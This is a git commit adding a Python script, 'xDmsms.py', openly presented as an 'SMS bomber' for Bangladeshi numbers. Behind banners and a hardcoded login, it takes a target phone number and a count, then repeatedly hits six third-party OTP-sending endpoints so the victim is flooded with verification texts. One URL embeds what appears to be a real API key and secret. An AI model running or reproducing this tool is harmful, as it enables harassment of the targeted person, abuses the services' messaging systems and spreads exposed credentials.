c9586f5382c71127e901fce85057d09dd3d0d6cc
xDmmAsTeR18 <94985934+xDmmAsTeR18@users.noreply.github.com>
2021-11-24 23:33:25 +0600

    Add files via upload

---
+++ xDmsms.py
@@ -0,0 +1,285 @@
+import os
+os.system("clear")
+import time
+cyan="\033[0;36m"         # Cyan
+color_off="\033[0m"       # Text Reset
+for i in range(38):
+    print(cyan+" xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm xDm"+color_off)
+    time.sleep(0.20)
+import os
+os.system("clear")
+import sys
+import getpass
+yellow="\033[0;33m"       # Yellow
+color_off="\033[0m"       # Text Reset
+on_igreen="\033[0;102m"   # Green
+bblack="\033[1;30m"       # Black
+ublue="\033[4;34m"        # Blue
+green="\033[0;32m"        # Green
+on_green="\033[42m"       # Green
+on_red="\033[41m"         # Red
+black="\033[0;30m"        # Black
+red="\033[0;31m"          # Red
+green="\033[0;32m"        # Green
+yellow="\033[0;33m"       # Yellow
+blue="\033[0;34m"         # Blue
+purple="\033[0;35m"       # Purple
+cyan="\033[0;36m"         # Cyan
+white="\033[0;37m"        # White
+on_black="\033[40m"       # Black
+on_red="\033[41m"         # Red
+on_green="\033[42m"       # Green
+on_yellow="\033[43m"      # Yellow
+on_blue="\033[44m"        # Blue
+on_purple="\033[45m"      # Purple
+on_cyan="\033[46m"        # Cyan
+on_white="\033[47m"       # White
+# You Can Change The Key's Name. But don't Change The Values.
+
+# Reset
+color_off="\033[0m"       # Text Reset
+
+# Regular Colors
+black="\033[0;30m"        # Black
+red="\033[0;31m"          # Red
+green="\033[0;32m"        # Green
+yellow="\033[0;33m"       # Yellow
+blue="\033[0;34m"         # Blue
+purple="\033[0;35m"       # Purple
+cyan="\033[0;36m"         # Cyan
+white="\033[0;37m"        # White
+
+# Bold
+bblack="\033[1;30m"       # Black
+bred="\033[1;31m"         # Red
+bgreen="\033[1;32m"       # Green
+byellow="\033[1;33m"      # Yellow
+bblue="\033[1;34m"        # Blue
+bpurple="\033[1;35m"      # Purple
+bcyan="\033[1;36m"        # Cyan
+bwhite="\033[1;37m"       # White
+
+# Underline
+ublack="\033[4;30m"       # Black
+ured="\033[4;31m"         # Red
+ugreen="\033[4;32m"       # Green
+uyellow="\033[4;33m"      # Yellow
+ublue="\033[4;34m"        # Blue
+upurple="\033[4;35m"      # Purple
+ucyan="\033[4;36m"        # Cyan
+uwhite="\033[4;37m"       # White
+
+# Background
+on_black="\033[40m"       # Black
+on_red="\033[41m"         # Red
+on_green="\033[42m"       # Green
+on_yellow="\033[43m"      # Yellow
+on_blue="\033[44m"        # Blue
+on_purple="\033[45m"      # Purple
+on_cyan="\033[46m"        # Cyan
+on_white="\033[47m"       # White
+
+# High Intensty
+iblack="\033[0;90m"       # Black
+ired="\033[0;91m"         # Red
+igreen="\033[0;92m"       # Green
+iyellow="\033[0;93m"      # Yellow
+iblue="\033[0;94m"        # Blue
+ipurple="\033[0;95m"      # Purple
+icyan="\033[0;96m"        # Cyan
+iwhite="\033[0;97m"       # White
+
+# Bold High Intensty
+biblack="\033[1;90m"      # Black
+bired="\033[1;91m"        # Red
+bigreen="\033[1;92m"      # Green
+biyellow="\033[1;93m"     # Yellow
+biblue="\033[1;94m"       # Blue
+bipurple="\033[1;95m"     # Purple
+bicyan="\033[1;96m"       # Cyan
+biehite="\033[1;97m"      # White
+
+# High Intensty backgrounds
+on_iblack="\033[0;100m"   # Black
+on_ired="\033[0;101m"     # Red
+on_igreen="\033[0;102m"   # Green
+on_iyellow="\033[0;103m"  # Yellow
+on_iblue="\033[0;104m"    # Blue
+on_ipurple="\033[10;95m"  # Purple
+on_icyan="\033[0;106m"    # Cyan
+on_iwhite="\033[0;107m"   # White
+print(red+"""
+        ,     \    /      ,        
+       / \    )\__/(     / \       
+      /   \  (_\  /_)   /   \      
+ ____/_____\__\@  @/___/_____\____ 
+|              \../               |author:xDmmAsTeR
+|          WELCOM TO XDM          |tool-version:0.43
+|        ----------------         |tool-name:SMS bomber
+|_________________________________|follow:on facebook
+         ××××xDmmAsTeR××××
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++       
+"""+color_off)
+
+n=5
+while n<10:
+	username="XDM"
+	password="LOVERS"
+	
+	
+	intusername=getpass.getpass(prompt=('\n'+'\033[1;33m'+'[Enter The Username]➙'+'\033[0m'))
+	intpassword=getpass.getpass(prompt=('\033[1;33m'+'[Enter The Password]➙'+'\033[0m'))
+	
+	if username==intusername and password==intpassword:
+		print('\033[1;32m','\nLogin sussecful','\033[0m'+'(😍)')
+		print('\n')
+		break
+		
+	else:
+		print('\033[1;31m','\nYour username or password is Wrong!','\033[0m'+'(😥)')
+		print('\n')
+		sys.exit()
+		
+
+		
+				
+						
+										
+#past main part
+import requests
+
+from requests.structures import CaseInsensitiveDict
+
+import os
+
+import sys
+
+import time
+
+os.system("pip install requests")
+
+os.system("clear")
+
+red="\033[0;31m"          # Red
+
+yellow="\033[0;33m"       # Yellow
+
+green="\033[0;32m"        # Green
+
+color_off="\033[0m"       # Text Reset
+
+bblack="\033[1;30m"       # Black
+
+bred="\033[1;31m"         # Red
+
+ured="\033[4;31m"         # Red
+
+on_green="\033[42m"       # Green
+
+blue="\033[0;34m"         # Blue
+
+lightblue = '\033[94m'
+
+red = '\033[91m'
+
+white = '\33[97m'
+
+yellow = '\33[93m'
+
+green = '\033[1;32m'
+
+cyan  = "\033[96m"
+
+end = '\033[0m'
+
+purple="\033[0;35m"
+print(yellow+"""
+       _____                                _______   _____  
+      |  __ \                        /\    |__   __| |  __ \ 
+ __  _| |  | |_ __ ___  _ __ ___    /  \   ___| | ___| |__) |
+ \ \/ / |  | | '_ ` _ \| '_ ` _ \  / /\ \ / __| |/ _ \  _  / 
+  >  <| |__| | | | | | | | | | | |/ ____ \\__  \ |  __/ | \ \ 
+ /_/\_\_____/|_| |_| |_|_| |_| |_/_/    \_\___/_|\___|_|  \_\     
+
+•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                                                                
+"""+color_off)
+print(cyan+"""
+          |****************************************|
+          |          WELCOME TO SMS BOMBING        |
+          '****************************************'
+    """+color_off)
+print(yellow+"•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••"+color_off)
+print(red+"                          (\"NOTICE\")"+color_off)
+print(red+"\t  This Tool Only Support In Bangladesh Country"+color_off)
+print(yellow+"•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••"+color_off)
+print(cyan+'\t\t If You Type [1] Send it 4+ SMS')
+
+
+print(' ')
+
+number=str(input(green+"[Enter Your Target Number]➙"+color_off))
+amount=int(input(green+"[Enter Your SMS Amount]➙"+color_off))
+
+url1 = "https://ss.binge.buzz/otp/send/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone="+number
+
+
+
+url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/json"
+headers2["Content-Length"] = "0"
+
+
+url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/json"
+
+data4 = '{\"mobile\":\"'+number+'\"}'
+
+url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "msisdn="+number
+
+url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/json"
+
+data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'
+
+for i in range (amount):
+        resp1 = requests.post(url1, headers=headers1, data=data1)
+        resp2 = requests.post(url2, headers=headers2)
+        resp3 = requests.get(url3)
+        resp4 = requests.post(url4, headers=headers4,data=data4)
+        resp5 = requests.post(url5, headers=headers5, data=data5)
+        resp = requests.post(url6, headers=headers6, data=data6)
+        print(str((i+1)*3)+cyan+'. ➙Success Requests Sent ⏳⌛'+color_off)
+
+print('                                 ')
+print(cyan+'\t   Thanks For Using xDmmAsTeR SMS Bombing Tool '+color_off)
+print(red+"       Note: I wont be responsible fo any illigal activites."+color_off)
+        
+import os
+os.system("clear")
+
+print("\n\n\n\n\n")
+print(green+"\t\tDO YOU WANT TO AGAIN USE MY TOOL"+color_off)
+print(green+"\t\tTHEN USE THESE COMMANDS"+color_off)
+print(cyan+"""
+\t\tls
+\t\tcd smsbomber
+\t\tls
+\t\tpython xDmsms.py
+"""+color_off)
